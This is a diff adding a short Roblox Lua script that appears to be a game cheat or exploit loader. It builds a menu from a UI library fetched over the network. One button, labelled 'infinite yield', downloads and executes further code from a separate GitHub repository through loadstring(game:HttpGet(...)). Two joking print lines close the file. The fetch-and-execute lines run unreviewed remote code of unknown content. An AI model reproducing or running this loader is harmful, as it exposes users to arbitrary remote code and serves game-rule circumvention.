@@ -1,0 +1,20 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "private script", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+	Name = "the one and only script",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Tab:AddButton({
+	Name = "infinite yield",
+	Callback = function(Value)
+      		print("button pressed")
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/sushi/main/X'),true))()
+  	end    
+})
+
+
+  
+print("IDropKickedMyMother 😀😀😀")
+print("that was a joke this is also for testing")
